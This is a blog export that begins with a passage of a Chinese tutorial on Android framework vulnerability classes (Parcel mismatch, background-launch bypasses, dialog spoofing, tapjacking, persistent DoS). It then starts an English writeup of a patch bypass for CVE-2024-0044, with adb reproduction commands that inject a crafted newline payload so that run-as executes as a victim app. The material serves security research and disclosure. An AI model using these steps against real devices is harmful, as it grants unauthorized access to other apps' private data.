的这篇文章：PendingIntent重定向：一种针对安卓系统和流行App的通用提权方法——BlackHat EU 2021议题详解 （下）（注：为了安全考虑，如果受害者是 root/system UID，授权时要求 URI 必须是几个特定 authority 否则会被拒绝，但对于系统中及应用市场中的海量应用，它们仍可能被攻击）为了保证安全性，Android 6.0 添加了 FLAG_IMMUTABLE 用于指定 PendingIntent 不可变，而 Android 12 添加了 FLAG_MUTABLE，target Android 12+ 的应用创建 PendingIntent 时必须显式指定可变性，不再让应用开发者随手写下的 0 变成安全漏洞，自此这一类漏洞销声匿迹。但有部分场景 PendingIntent 仍然是可变的，此时就要万分小心。CVE-2017-0639：危险的 URIURI 在 Android 中非常常用，如常见的分享文件操作，就是创建一个 ACTION_SEND 的 intent，把要分享的文件的 URI 放到里面，然后 startActvity。常见的有安全影响的 URI 有 content uri 和 file uri（Android 7.0+ 已弃用）等。这里其实有一点要注意的，就是接收到的 URI 可能指向原本发送者不应该有权限访问的数据，如果受害应用不加检查直接使用，就有可能造成信息泄漏。本例的 CVE-2017-0639 就是这样一个漏洞，漏洞补丁：OPP: Restrict file based URI access to external storage作者写的文章也可以看一下。这里提一个点就是，禁止向外传出 file:// URI 这个功能只是 Strict mode 的限制，只需要把 strict mode 关闭就好。file:// URI 从 Android 7.0 开始被弃用，像这样直接构造指向私有文件的 file URI 的这种利用手法近几年应该是几乎绝迹，但像这样缺失 URI 检查的漏洞其实还有很多，最近比较多的是高权限应用程序接收 URI 时没有检查该 URI 是否指向其他用户，从而允许一个用户越权读取到另一个用户的媒体。content URI 正常格式为 content://host:port/path/id，跨用户的 content URI 会在 host 前面加上用户 ID，形如 content://10@host:port/path/id。广播权限与保护广播上文中说到四大组件都可以定义权限，限制只能有对应权限的个体访问，但其实对于广播来说，它还有额外的保护机制。我们常用的 BOOT_COMPLETED 等广播都是只有系统能发送，如果应用发送了这种广播，会发生什么？答案是会被系统拒绝发送。这一系列的广播对系统极为重要，如果第三方应用可以随意发送，比如发送 android.intent.action.REBOOT，系统就重启了；发送 android.intent.action.MASTER_CLEAR，系统就会开始恢复出厂设置。当时为了解决这个问题，一种方法是限制所有的系统广播接收器必须加上权限，只有拥有系统权限才能访问，但是难搞的是，这些广播中有一些是粘性广播（sticky broadcasts），它在系统中会长时间存留，直到后一个覆盖前一个，这样应用仍然有机会覆盖粘性广播的数据；另一个选择是，给这些广播都定义上权限，只有有权限的个体才能发送，但是给这些广播一个一个定义专用权限显然不现实，于是保护广播便诞生了，还是限制只有系统能发送，但是没有像传统一样定义特别的权限。很显然，这么多危险的广播，如果有一个被漏掉忘记被保护，或者定义保护广播没有生效，就会出现严重的安全漏洞。事实上，历史上确实发生过类似的漏洞：CVE-2017-0601 和 CVE-2020-0391。另外一点，系统内部也大量应用了广播机制传递信息，广播这玩意和 Activity Service Provider 都不同，一次广播可能被多个个体接收，如果说系统内部发送广播传递内部信息的时候没有指定接收者，那就有可能被第三方应用拿到敏感信息。但是，我们不可能把所有已知会接收这个广播的可信应用硬编码在代码里，由此就引入了另一个安全机制，不仅广播接收者可以指定要有某某权限才能给我发广播，发送者也可以指定接收者必须有某某权限才能收到广播，利用现有的权限机制解决了问题。这里可能出现的漏洞就是写代码的人粗心大意忘记指定权限，导致信息被其他不相关应用接收。（题外话，其实隐式 intent 启动 Activity 也有可能出现类似问题，三方应用定义一个相同的 intent-filter 就有机会被系统启动，不过这种漏洞偏少，启动 activity 只会启动一个，可以通过在 intent-filter 配置大于 0 的优先级来解决。不过也不是没有，CVE-2020-0396）。Parcel Mismatch其实这一段不应该放在组件与意图的，但是真的不知道该放哪。除了传统的 Java 序列化方法，android 还为跨进程通信专门设计了一套轻量级的序列化方案：Parcelable。和 Serializable 不同，使用 Parcelable 要求开发者手动往 parcel 写入或读取数据。以下展示了一个典型的 Parcelable 实现类：12345678910111213141516171819202122232425262728public class Person implements Parcelable &#123; private String name; private int age; private int money; public static final Creator&lt;Person&gt; CREATOR = new Creator&lt;Person&gt;() &#123; @Override public Person createFromParcel(Parcel in) &#123; Person obj = new Person(); obj.name = in.readString(); obj.age = in.readInt(); obj.money = in.readInt(); return obj; &#125; @Override public Person[] newArray(int size) &#123; return new Person[size]; &#125; &#125;; @Override public int describeContents() &#123; return 0; &#125; @Override public void writeToParcel(@NonNull Parcel dest, int flags) &#123; dest.writeString(name); dest.writeInt(age); dest.writeInt(money); &#125;&#125;假如这里程序员手滑了，write 写入的数据和 read 读取的数据不匹配，比如说一边写了 long 另一半读了 int 或者忘记读某个字段，会发生什么问题吗？查看以上代码，两次 readInt 调用同一个方法能读取到不同的数据，而且读取顺序和写入顺序完全相同，这说明 Parcel 内部必定存在着一个偏移值，每次 read 读取当前偏移的数据然后自增偏移。假如 read 没有完全消费它写入的所有值，那么 parcel 中残留的值可能会影响后续值的解析。举个例子，假如有如下 aidl 函数定义：1void registerPerson(Person person, int flags);假如 Person 中最后一行 obj.money = in.readInt() 缺失了，那么 Person 对象反序列化完之后，还会有一个 int 残留在 parcel 内，接下来尝试读取 flags 调用 readInt 时实际上读取到的是 Person 残留的 money 而不是正确的 flags。再回过头来看一下之前 LaunchAnywhere 漏洞，当时的修复补丁是，authenticator 返回 intent 后 AccountManagerService 检查 intent 要调起的 activity 的包的签名是否与 authenticator 自身匹配，匹配才发送给调用者让它打开。这里有一个点，authenticator 返回的数据类型实际上是 Bundle，intent 也是放进 bundle 里存储的。Bundle 这里可以简单理解为一个 map，存储着键值对，里面值的类型除了可以是基本类型和 String，还可以是任意 Parcelable 对象。这两点结合起来，会碰撞出怎样的火花呢？注意上面检查 bundle 是在 AccountManagerService 中，它在 system_server 中运行，而实际调起 activity 的操作在调用者进程中，所以这里 bundle 从 system_server 到 app 还要经过一次序列化和反序列化。我们已经知道 bundle 是一个 map 且可以存储任意 Parcelable 对象，那假如我们在 bundle 中任意放一个反序列化错位的对象，就有机会污染它后面的键值对，通过精心构造内存布局，我们甚至能让 AccountManagerService 检查时找不到 intent，而经过一次序列化和反序列化传输到 app 后却能找到 intent，绕过 LaunchAnywhere 漏洞的修复！由于 Bundle 接受任意 Parcelable，所以实际上任何有问题的 Parcelable 都能拿来这样利用！这种技术有一个特别的名字，叫 Self-changing Bundle。2023 年国内某电商软件大肆在野利用的其中一个漏洞 CVE-2023-20963 就属于此类漏洞。获得了以系统权限启动任意 Activity 的能力后，可以利用系统内部一些 activity 的 intent redirection，设置 data 和 flags 拿到内部 content provider 如一些 file provider 的读写权限，可以越权读写系统关键文件，改写系统配置；另一种利用方案是攻击其他应用未导出的组件，读写应用内部数据甚至向其他应用注入恶意代码。由于 Google 已经意识到这类漏洞的强大破坏力，在 Android 13 中引入了多个机制缓解此类漏洞，如 Lazy Bundle 和 Parcel.enforceNoDataAvail()。另外 Google 在 AccountManagerService 引入了一个新的 checkKeyIntentParceledCorrectly 函数，校验 bundle 中的 intent 反序列化前后是否一致，并把该补丁一路向下 backport 到了 Android 11，算是基本封死了这类利用 bundle 的方法。更多关于这类漏洞的细节，可以参考以下文章：Android 反序列化漏洞攻防史话Creator MismatchClang 裁缝店：LaunchAnyWhere 补丁绕过：Android Bundle Mismatch 系列漏洞 复现与分析同时强烈建议查看 Michał Bednarski 的 GitHub 主页，大部分都是 parcel mismatch 类漏洞且每一个都有很详细的 writeup。组件启动的后台限制Android 系统对在后台运行的应用施加严格限制，如果应用有办法绕过这些限制，就可能被视为安全漏洞。本节我们主要关注以下限制：从后台启动 activity 的限制从后台启动前台服务的限制同时我们定义以下缩写：BAL：Background activity launch，绕过上面的第一个限制BG-FGS：Background-Foreground Service start，绕过上面的第二个限制WIU：while-in-use 权限，简称前台权限，指用户仅允许应用“在使用中才能获得”的权限恶意应用利用 BAL 漏洞可以在后台随意弹出广告，严重影响用户对手机的正常使用。能够绕过 BAL 限制的漏洞一般至少都会被授予 High 等级，而虽然绕过 BG-FGS 限制并不被直接视为是安全漏洞，但如果能从后台获取 WIU 权限，仍然会被认为是高危。部分此类漏洞具有相似的模式，从近几个月的安全广告来看也确实每隔一两个月都有类似漏洞出现。本节我们主要介绍利用 PendingIntent 实现 BAL。以 Android 14 为例，系统判断 BAL 是否被允许的逻辑在 BackgroundActivityStartController.checkBackgroundActivityStart() 里，判断是否能启动前台服务的逻辑则在 ActiveServices.canStartForegroundServiceLocked()。以 BAL 为例，我们这里就不分析完整判断逻辑了，实在是太长了，详细分析绝对不是这里能写完的。我们主要关注这一小段：1234567891011121314151617181920212223242526272829// Legacy behavior allows to use caller foreground state to bypass BAL restriction.// The options here are the options passed by the sender and not those on the intent.final BackgroundStartPrivileges balAllowedByPiSender = PendingIntentRecord.getBackgroundStartPrivilegesAllowedByCaller( checkedOptions, realCallingUid, realCallingPackage);final boolean logVerdictChangeByPiDefaultChange = checkedOptions == null || checkedOptions.getPendingIntentBackgroundActivityStartMode() == ComponentOptions.MODE_BACKGROUND_ACTIVITY_START_SYSTEM_DEFINED;final boolean considerPiRules = logVerdictChangeByPiDefaultChange || balAllowedByPiSender.allowsBackgroundActivityStarts();final String verdictLogForPiSender = balAllowedByPiSender.allowsBackgroundActivityStarts() ? VERDICT_ALLOWED : VERDICT_WOULD_BE_ALLOWED_IF_SENDER_GRANTS_BAL;@BalCode int resultIfPiSenderAllowsBal = BAL_BLOCK;if (realCallingUid != callingUid &amp;&amp; considerPiRules) &#123; resultIfPiSenderAllowsBal = checkPiBackgroundActivityStart(callingUid, realCallingUid, backgroundStartPrivileges, intent, checkedOptions, realCallingUidHasAnyVisibleWindow, isRealCallingUidPersistentSystemProcess, verdictLogForPiSender);&#125;if (resultIfPiSenderAllowsBal != BAL_BLOCK &amp;&amp; balAllowedByPiSender.allowsBackgroundActivityStarts() &amp;&amp; !logVerdictChangeByPiDefaultChange) &#123; // The result is to allow (because the sender allows BAL) and we are not interested in // logging differences, so just return. return resultIfPiSenderAllowsBal;&#125;如果调用者实际上不是自己 startActivity，而是发送了由其他 UID 创建的 PendingIntent （或 IntentSender，实际上是 PendingIntent 内部实现），则 realCallingUid != callingUid 会成立，然后会调用 checkPiBackgroundActivityStart：1234567891011121314151617181920212223242526272829303132333435363738394041424344private @BalCode int checkPiBackgroundActivityStart(int callingUid, int realCallingUid, BackgroundStartPrivileges backgroundStartPrivileges, Intent intent, ActivityOptions checkedOptions, boolean realCallingUidHasAnyVisibleWindow, boolean isRealCallingUidPersistentSystemProcess, String verdictLog) &#123; final boolean useCallerPermission = PendingIntentRecord.isPendingIntentBalAllowedByPermission(checkedOptions); if (useCallerPermission &amp;&amp; ActivityManager.checkComponentPermission( android.Manifest.permission.START_ACTIVITIES_FROM_BACKGROUND, realCallingUid, -1, true) == PackageManager.PERMISSION_GRANTED) &#123; return logStartAllowedAndReturnCode(BAL_ALLOW_PENDING_INTENT, /*background*/ false, callingUid, realCallingUid, intent, \"realCallingUid has BAL permission. realCallingUid: \" + realCallingUid, verdictLog); &#125; // don't abort if the realCallingUid has a visible window // TODO(b/171459802): We should check appSwitchAllowed also if (realCallingUidHasAnyVisibleWindow) &#123; return logStartAllowedAndReturnCode(BAL_ALLOW_PENDING_INTENT, /*background*/ false, callingUid, realCallingUid, intent, \"realCallingUid has visible (non-toast) window. realCallingUid: \" + realCallingUid, verdictLog); &#125; // if the realCallingUid is a persistent system process, abort if the IntentSender // wasn't allowed to start an activity if (isRealCallingUidPersistentSystemProcess &amp;&amp; backgroundStartPrivileges.allowsBackgroundActivityStarts()) &#123; return logStartAllowedAndReturnCode(BAL_ALLOW_PENDING_INTENT, /*background*/ false, callingUid, realCallingUid, intent, \"realCallingUid is persistent system process AND intent \" + \"sender allowed (allowBackgroundActivityStart = true). \" + \"realCallingUid: \" + realCallingUid, verdictLog); &#125; // don't abort if the realCallingUid is an associated companion app if (mService.isAssociatedCompanionApp( UserHandle.getUserId(realCallingUid), realCallingUid)) &#123; return logStartAllowedAndReturnCode(BAL_ALLOW_PENDING_INTENT, /*background*/ false, callingUid, realCallingUid, intent, \"realCallingUid is a companion app. \" + \"realCallingUid: \" + realCallingUid, verdictLog); &#125; return BAL_BLOCK;&#125;如果 realCallingUid 即 PendingIntent/IntentSender 的发送者拥有可见窗体，或者是需要持续运行的系统重要进程，那么就有机会被允许。常见的是很多 OEM 在 system uid 的进程中实现手势导航等自定义功能，导致系统认为 system uid 具有可见窗口，暴露攻击面。而系统中有很多接收 PendingIntent/IntentSender 的接口，一般用于异步操作完成后向调用者发送返回值，如果忘记在 options 内指定参数禁止 BAL，那就有可能被我们利用。以 CVE-2023-21081 &amp; CVE-2023-21099 为例，系统中 PackageManager 多个 API 接受一个 IntentSender 作为回调接口，而发送该 IntentSender 时没有指定 options 导致其为默认的 null。解决方法就是加一个 options 并且 setPendingIntentBackgroundActivityLaunchAllowed(false)。这里有一点，Android 14 中对 BAL 限制做出了一些增强，其中 “应用会收到来自其他可见应用发送的 PendingIntent” 一项中加了一个对我们很重要的限制：Note: Starting from Android 14, apps targeting Android 14 or higher must opt in to allow background activity launch when sending a PendingIntent. To opt in, the app should pass an ActivityOptions bundle with setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)getDefaultBackgroundStartPrivileges 在 options 为空时返回的默认值也有更改，可能不允许 BAL：1234567891011121314151617181920public static BackgroundStartPrivileges getDefaultBackgroundStartPrivileges( int callingUid, @Nullable String callingPackage) &#123; if (UserHandle.getAppId(callingUid) == Process.SYSTEM_UID) &#123; // We temporarily allow BAL for system processes, while we verify that all valid use // cases are opted in explicitly to grant their BAL permission. // Background: In many cases devices are running additional apps that share UID with // the system. If one of these apps targets a lower SDK the change is not active, but // as soon as that app is upgraded (or removed) BAL would be blocked. (b/283138430) return BackgroundStartPrivileges.ALLOW_BAL; &#125; boolean isChangeEnabledForApp = callingPackage != null ? CompatChanges.isChangeEnabled( DEFAULT_RESCIND_BAL_PRIVILEGES_FROM_PENDING_INTENT_SENDER, callingPackage, UserHandle.getUserHandleForUid(callingUid)) : CompatChanges.isChangeEnabled( DEFAULT_RESCIND_BAL_PRIVILEGES_FROM_PENDING_INTENT_SENDER, callingUid); if (isChangeEnabledForApp) &#123; return BackgroundStartPrivileges.ALLOW_FGS; &#125; else &#123; return BackgroundStartPrivileges.ALLOW_BAL; &#125;&#125;再加上大部分这种漏洞都已经被挖完了，这种漏洞在 2024 年之后基本在 AOSP 中绝迹。想要了解更多的话，可以查看 OPPO 的这篇文章：恶意 App 后台弹窗技术手法分析骗！偷袭！不讲武德！上面介绍了很多技术漏洞，这一节从人出发，介绍几个原理很简单朴素的漏洞。CVE-2018-9432：一个小小的字符串能有什么坏心思呢？假如说，你是系统开发者，你自定义了一个特权操作，比如从用户绑定的钱包里划走一百块，同时允许应用调用你定义的接口请求这个操作，那肯定得需要得到用户明确允许才行。一般的做法是设计一个对话框，如下所示，其中 &lt;appname&gt; 代表发起请求的应用名称：123&lt;appname&gt; 正在请求消费 100 元人民币，此笔款项将会从您的钱包中扣除。您确认要支付吗？取消 确认而如果我们将应用名设置的特别长，会怎么样呢？我们精心设置一个超长的应用名，它会这样显示：1234567891011121314151617&lt;XX 应用需要您同意隐私协议。XX 应用隐私协议：1. 本应用由 xxx 公司开发。2. 本应用在运行过程中，需要以下权限运行：(1). 网络权限。本应用需要此权限以连接服务器、向服务器发送数据并拉取数据。您必须授予此权限。(2). 存储卡权限。本应用部分功能需要读写您的照片、笔记等内容，因此需要存储卡权限。我们不会滥用通过此权限获得的数据，也不会将其持久化存储或上传到网络。我们只在您使用特定功能时请求此权限，您也可以随时拒绝或撤销此权限。不授予此权限不会对其他功能产生影响。.......如您同意此协议，请点击“确认”继续运行。如您拒绝此协议，本应用无法运行并将自动退出。&gt; 正在请求消费 100 元人民币，此笔款项将会从您的钱包中扣除。您确认要支付吗？取消 确认这里用 &lt;&gt; 括起来的一大段其实都是应用名。而受限于屏幕大小限制，对话框显示的时候只能显示前面的应用名，真正的“正在请求消费”信息被挤下去了。如果用户没有注意到对话框文本可以滑动（事实上就算注意到了，估计也会认为剩下的全是又臭又长的协议），直接点了确认，就会不知不觉间损失财产。实际生活中的支付对话框当然不可能设计的这么简单，但历史上确实出现过此类漏洞，如 CVE-2015-3878 屏幕录制授权欺骗漏洞、CVE-2017-13242 蓝牙配对欺骗漏洞、CVE-2018-9432: 蓝牙通讯录访问欺骗漏洞等。感兴趣的可以查看这篇文章：Android 中的特殊攻击面（一）——邪恶的对话框高版本 Android 系统对话框做了一些更改，如权限请求对话框的“允许”“拒绝”选项现在和对话框的内容放在一起，用户必须完全滚动到最下方才能点到按钮，算是基本杜绝了此类漏洞。CVE-2021-0314：UI 覆盖与点按劫持Android 有一个功能，允许应用在其他应用之上显示内容，通常简称为“悬浮窗”。早在 Android 4.x 时代，恶意开发者就已经滥用这个权限制作恶意软件，如在设备开机时显示全屏悬浮窗阻止用户使用手机，从而勒索钱财，即所谓的“锁机软件”。通过这个功能，还可以实现很多有意义的攻击。还是以上面的对话框为例，这次我们不使用超长应用名称，而是利用悬浮窗功能，在对话框显示的同时覆盖我们自己的内容到对话框的文本上面，用户很容易就会被误导点击确认。这种类型的攻击叫做点按劫持攻击（Tapjacking Attack）。对大部分情况来说，能够被其他应用覆盖并不是安全问题，而对于敏感对话框，可以通过申请 HIDE_NON_SYSTEM_OVERLAY_WINDOWS 权限并对当前 window 添加 SYSTEM_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS 这个属性或调用 setHideOverlayWindows 来隐藏所有的非系统悬浮窗，还可以通过 filterTouchesWhenObscured onFilterTouchEventForSecurity 等 API 过滤可能被劫持的输入事件。但实际上，Android 系统自身也出现过多个忘记对敏感对话框使用防御措施的漏洞，如此例的 CVE-2021-0314 便是卸载应用的确认对话框。想要了解更多，可以查看以下文章：Google 官方对点按劫持的介绍不可忽视的威胁：Android中的点击劫持攻击宁为玉碎 —— 拒绝服务类攻击Android 的漏洞分类中，还有一种特殊的漏洞，既不能像影视剧里的黑客一样敲敲键盘入侵敌国核弹系统，也不能泄漏别人的银行卡密码，它能做的只有使手机工作出现异常。它就是拒绝服务类漏洞。虽然不像 RCE、EoP、ID 那么亮眼，但也不能小看这类一不小心就让你手机变砖头的漏洞。在 Android 的漏洞严重程度定义中，有如下内容：严重（Critical）：设备遭到远程发起的持久性拒绝服务攻击（永久性损坏、需要重新刷写整个操作系统或恢复出厂设置）高（High）：设备遭到本地发起的持久性拒绝服务攻击（永久性损坏、需要重新刷写整个操作系统或恢复出厂设置）；攻击者可以在没有用户互动的情况下远程阻止对移动网络或 Wi-Fi 服务的访问（例如，用格式不正确的数据包使移动网络无线装置服务崩溃）中（Moderate）：设备遭到远程发起的设备暂时性拒绝服务攻击（远程挂起或重新启动设备）能达到“严重”程度的 DoS 漏洞很少见，看见过的几个都是 TextView 文字渲染的崩溃或者死循环。我们主要瞄准严重程度“高”的漏洞。想要“持久性拒绝服务攻击”，比如让手机系统崩溃开不了机无限重启，除了利用系统本身的缺陷，很容易能想到的还有传统 DoS 中的“资源耗尽”，简单来说，占用系统大量资源使其停止工作。但是，让 system_server 崩溃一次最多只会造成系统软重启一次，并不算持久。怎么样才能持久呢？“持久”，这两个字能描述的东西，还有数据。如果能够将恶意的数据保存下来，系统每次启动尝试去读取它的时候就都会崩溃，陷入死局。而所谓“能让系统崩溃的恶意数据”除了精心构造的、利用代码本身问题的数据，很容易能想到的还有超大量的数据，在系统处理的过程中耗尽系统内存资源触发崩溃。以 CVE-2021-0934 为例，Account 就是要被持久化存储的数据，虽然已经考虑到系统资源负担，对 Account 内字符串的大小及 Account 数量做出限制，然而字符串大小限制在客户端，能被绕过。这里注意，binder 一次能传输数据的大小也是有限制的，大概在 1mb 左右，所以还不能一次传太大，只能一个一个传。像这样的漏洞还有很多，系统开发者设计接口时一不小心忘记加上限制就有可能变成一个 CVE，如 CVE-2022-20494。这种一点一点增大系统资源负载的攻击很像成语“压死骆驼的最后一根稻草”的故事，因此也被称为稻草攻击（Straw Attack）。复旦大学有一篇论文《Exploit the Last Straw That Breaks Android Systems》，发表在 IEEE Symposium on Security and Privacy. 2022 上，专门介绍这类攻击手法，感兴趣的可以看一下。英文不太好的同学也可以看看这篇译文《稻草攻击：压死安卓系统的最后一根稻草》。（这算是把中文翻译成英文又翻译成中文吗？）扩展阅读上面的文章里放了很多文章，这里再放一些同样很优秀的扩展类文章。强烈建议阅读 OPPO 几个微信公众号发布的系列文章。小路：Android 系统安全和黑灰产对抗OPPO 安珀实验室：Android Java Framework 漏洞挖掘快速上手方法OPPO 安珀实验室：Android 本地服务漏洞挖掘技术 这里只放了上篇的链接，剩下两篇自己去微信公众号看吧……结语本文介绍了大量 Android 系统中的漏洞，并尝试总结出一些常见类型，希望能给对 Android 系统安全感兴趣的人一点帮助。当然，如果你想成为一名专业的 Android 安全研究员，传统二进制漏洞如 buffer overflow、use-after-free 等也肯定是需要了解的。我个人觉得，入门学习 Android 安全最好的时间是 2023 年之前。在 2023 年之前，只要附上一份高质量的漏洞描述，单个 moderate 级别漏洞就能获得 $2000 奖励，High/Critical 更高，而且只要是有效漏洞，Google 给予的漏洞分级一般都不会低于 moderate。如果提交了补丁且被接受，就有机会额外再加 $1000。然而，从 2023 年 5 月开始，moderate 级别漏洞奖金大幅缩水，最高只有 $250，且大部分此级别漏洞不再被分配 CVE。笔者曾经提交过 Moderate Severity + Medium Quality 的 bug report，得到的回复是不符合奖励标准。即使获得奖金，Google 的动作也实在是有些慢。笔者曾经询问过奖金进度，得到的回复是这样的：Hello,Thanks for reaching out. Rewards are processed at 90 days after submission and once it has been processed, you will receive an email with details on the next steps to collect the reward.Best Regards,Android Security Team嗯，90 天，Only Google can do。而对于一个被确认的安全漏洞的生命周期是这样的：Initial severity rating assessment (subject to change after review by component owners) (3)Development of an updateAssignment of CVEShared under NDA, as part of coordinated disclosure, to Android partners for remediationRelease in a public Android security bulletinAndroid Security Rewards payment (if applicable)而 Google 的慢会体现在每一步上，第一步的评级就有可能花几个月。即使内部已经写出来了修复，Google 也要首先向所有合作伙伴共享该漏洞，然后至少等一个月才会在每月安全公告中发布。不过值得高兴的一点是，大部分时候漏洞赏金都会在漏洞被修复之前就给你。很明显，如果你是一个独立的安全研究员，指望靠挖洞吃饭，先不论你能找到多少洞获得多少钱，就这个速度，估计你在钱到手上之前就饿死了。当然，如果你背后有着专业的安全公司或者团队，或者就是对安全感兴趣想来试试，那可以当我没说。我相信人的兴趣来了没有人能挡住，就像以前的我一样 （你先把你脑子治好再说话才能让人信服）。如果你仍然愿意投入时间精力研究，那我相信你不会被亏待。残页 于 2025/01/29：原本在这里写了个天道酬勤的，最后还是删了。祝大家都能找到自己的幸福","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"安全","slug":"安全","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Reviving an already patched vulnerability for half a year? The second spring of CVE-2024-0044","slug":"CVE-2024-0044","date":"2024-10-08T00:00:00.000Z","updated":"2025-04-24T10:33:02.808Z","comments":true,"path":"2024/10/08/CVE-2024-0044/","link":"","permalink":"https://blog.canyie.top/2024/10/08/CVE-2024-0044/","excerpt":"This is a bypass of the initial patch of CVE-2024-0044, a High severity vulnerability in the Android framework that allows attackers with adb access to execute arbitrary code under the UID of arbitrary app.The following is copied from my repo https://github.com/canyie/CVE-2024-0044 for backup purposes. For more info such as PoC code, please check the original repo.","text":"This is a bypass of the initial patch of CVE-2024-0044, a High severity vulnerability in the Android framework that allows attackers with adb access to execute arbitrary code under the UID of arbitrary app.The following is copied from my repo https://github.com/canyie/CVE-2024-0044 for backup purposes. For more info such as PoC code, please check the original repo.BasicsCVE-2024-0044/A-307532206 is a High severity vulnerability in the Android framework that allows attackers with adb access to run arbitrary code under the UID of arbitrary app. It was originally found by Tom Hebb from Meta Red Team X. You can found many articles on exploit this vulnerability on the Internet such as this and this. For more info, check this blog: https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.htmlThe patch for this vulnerability is included in the March 2024 Android Security Bulletin, but now I come up with an exploit that bypasses the patch. The new patch is included in October 2024 Android Security Bulletin under the same CVE ID CVE-2024-0044. Android 12-13 devices with security patch level before 2024-10-01 are vulnerable to this issue.The repo contains a minimum reproducible PoC and a writeup.What’s wrong with the original patch?The patch added a validation for installer package name passed to the PackageManagerService:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657diff --git a/services/core/java/com/android/server/pm/PackageInstallerService.java b/services/core/java/com/android/server/pm/PackageInstallerService.javaindex 2ca3e8f..02515cf 100644--- a/services/core/java/com/android/server/pm/PackageInstallerService.java+++ b/services/core/java/com/android/server/pm/PackageInstallerService.java@@ -47,6 +47,7 @@ import android.content.pm.PackageManager; import android.content.pm.ParceledListSlice; import android.content.pm.VersionedPackage;+import android.content.pm.parsing.ParsingPackageUtils; import android.graphics.Bitmap; import android.net.Uri; import android.os.Binder;@@ -601,17 +602,22 @@ // App package name and label length is restricted so that really long strings aren't // written to disk.- if (params.appPackageName != null- &amp;&amp; params.appPackageName.length() &gt; SessionParams.MAX_PACKAGE_NAME_LENGTH) &#123;+ if (params.appPackageName != null &amp;&amp; !isValidPackageName(params.appPackageName)) &#123; params.appPackageName = null; &#125; params.appLabel = TextUtils.trimToSize(params.appLabel, PackageItemInfo.MAX_SAFE_LABEL_LENGTH); - String requestedInstallerPackageName = (params.installerPackageName != null- &amp;&amp; params.installerPackageName.length() &lt; SessionParams.MAX_PACKAGE_NAME_LENGTH)- ? params.installerPackageName : installerPackageName;+ // Validate installer package name.+ if (params.installerPackageName != null &amp;&amp; !isValidPackageName(+ params.installerPackageName)) &#123;+ params.installerPackageName = null;+ &#125;++ String requestedInstallerPackageName =+ params.installerPackageName != null ? params.installerPackageName+ : installerPackageName; if ((callingUid == Process.SHELL_UID) || (callingUid == Process.ROOT_UID)) &#123; params.installFlags |= PackageManager.INSTALL_FROM_ADB;@@ -935,6 +941,19 @@ throw new IllegalStateException(\"Failed to allocate session ID\"); &#125; + private static boolean isValidPackageName(@NonNull String packageName) &#123;+ if (packageName.length() &gt; SessionParams.MAX_PACKAGE_NAME_LENGTH) &#123;+ return false;+ &#125;+ // \"android\" is a valid package name+ String errorMessage = ParsingPackageUtils.validateName(+ packageName, /* requireSeparator= */ false, /* requireFilename */ true);+ if (errorMessage != null) &#123;+ return false;+ &#125;+ return true;+ &#125;+You can see params.installerPackageName will be reset to null if it is not an legal Android package name. However, at the next line, requestedInstallerPackageName can be installerPackageName when params.installerPackageName is null or invalid.What is installerPackageName?Let’s take a look at the createSessionInternal method, where the patch was added to:1234567891011121314@Overridepublic int createSession(SessionParams params, String installerPackageName, String callingAttributionTag, int userId) &#123; try &#123; return createSessionInternal(params, installerPackageName, callingAttributionTag, userId); &#125; catch (IOException e) &#123; throw ExceptionUtils.wrap(e); &#125;&#125;private int createSessionInternal(SessionParams params, String installerPackageName, String installerAttributionTag, int userId) throws IOException&#123;&#125;You can see that installerPackageName is a separate argument that does not come from param. The original patch validated params.installerPackageName, but forgot to validate installerPackageName.ReproductionYou can just use the original exploit code from Tom Hebb’s blog to reproduce it. This repo also contains a minimum reproducible PoC. If you want to test my PoC, just build it, push the generated apk to /data/local/tmp/poc.apk, then run the following code with adb shell:12345APK=/data/local/tmp/poc.apkPAYLOAD=\"@nullvictim &lt;victim uid&gt; 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null\"app_process -Djava.class.path=$APK /system/bin top.canyie.cve_2024_0044.PoC \"$APK\" \"$PAYLOAD\"run-as victimreplace &lt;victim uid&gt; with the UID of the victim app.If you want to play the game again, run adb uninstall top.canyie.cve_2024_0044 and re-run the code above.How it happened twice?The issue looks obvious, how did it escape everyone’s sight?Well, Google did add a test for this issue to ensure it is fixed:1234567891011121314151617181920212223242526272829303132333435363738394041424344// Set vulnerable 'appPackageName' and 'installerPackageName'// for 'SessionParams' instancefinal String vulnPackageName = context.getPackageName() + \"\\n\" + context.getPackageName();final SessionParams params = new SessionParams(MODE_FULL_INSTALL);params.setAppPackageName(vulnPackageName);params.setInstallerPackageName(vulnPackageName);final List&lt;String&gt; vulnerableFields = new ArrayList&lt;String&gt;();runWithShellPermissionIdentity( () -&gt; &#123; // Create session using 'SessionParams' instance, get 'appPackageName' and // 'installerPackageName' corresponding to session and abandon session later final PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller(); final int sessionId = packageInstaller.createSession(params); final String vulnerableAppPackageName = packageInstaller.getSessionInfo(sessionId).getAppPackageName(); final String vulnerableInstallerPackageName = packageInstaller .getSessionInfo(sessionId) .getInstallerPackageName(); packageInstaller.abandonSession(sessionId); // Without fix, 'appPackageName' and 'installerPackageName' does not undergo // internal validation and are set to 'vulnPackageName' which contain '\\n' if (vulnerableAppPackageName != null &amp;&amp; vulnerableAppPackageName.contains(\"\\n\")) &#123; vulnerableFields.add(\"'SessionParams.appPackageName'\"); &#125; if (vulnerableInstallerPackageName != null &amp;&amp; vulnerableInstallerPackageName.contains(\"\\n\")) &#123; vulnerableFields.add(\"'SessionParams.installerPackageName'\"); &#125; &#125;);String errorMessage = \"Device is vulnerable to b/307532206 !!\" + \" packages.list newline injection allows\" + \" run-as as any app from ADB\" + \" Due to : Fix is not present for \";assertWithMessage(errorMessage.concat(String.join(\" , \", vulnerableFields))) .that(vulnerableFields) .isEmpty();The test uses the public standard PackageInstaller API which does not allow customizing installerPackageName. In the public API, installerPackageName is always set to the real package name of provided Context:1234567891011public int createSession(@NonNull SessionParams params) throws IOException &#123; try &#123; return mInstaller.createSession(params, mInstallerPackageName, mAttributionTag, mUserId); &#125; catch (RuntimeException e) &#123; 